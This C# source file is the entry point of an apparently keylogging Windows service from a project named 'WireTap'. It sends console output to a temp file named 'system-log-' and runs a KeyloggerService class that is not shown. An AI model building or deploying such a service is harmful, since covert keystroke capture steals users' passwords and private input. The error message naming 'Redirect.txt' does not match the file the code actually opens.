namespace WireTap.WiindowsService2
{
    using System;
    using System.IO;
    using System.ServiceProcess;
    using WireTap.WindowsService;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main()
        {
            var logFileName = Helpers.CreateTempFileName(".log", "system-log-");
            FileStream fileStream;
            StreamWriter streamWriter;
            TextWriter consoleOut = Console.Out;
            try
            {
                fileStream = new FileStream(logFileName, FileMode.OpenOrCreate, FileAccess.Write);
                streamWriter = new StreamWriter(fileStream);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Cannot open {logFileName} for writing");
                Console.WriteLine(string.Concat(ex.Message, '\n', ex.StackTrace));
                return;
            }
            Console.SetOut(streamWriter);
            Console.WriteLine("This is a line of text");
            Console.WriteLine("Everything written to Console.Write() or");
            Console.WriteLine("Console.WriteLine() will be written to a file");
            try
            {
                var services = new ServiceBase[] { new KeyloggerService() };
                ServiceBase.Run(services);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Cannot open Redirect.txt for writing");
                Console.WriteLine(string.Concat(ex.Message, '\n', ex.StackTrace));
                return;
            }
            finally
            {
                Console.WriteLine("Stopping service");
                Console.SetOut(consoleOut);
                streamWriter.Close();
                fileStream.Close();
            }
        }
    }
}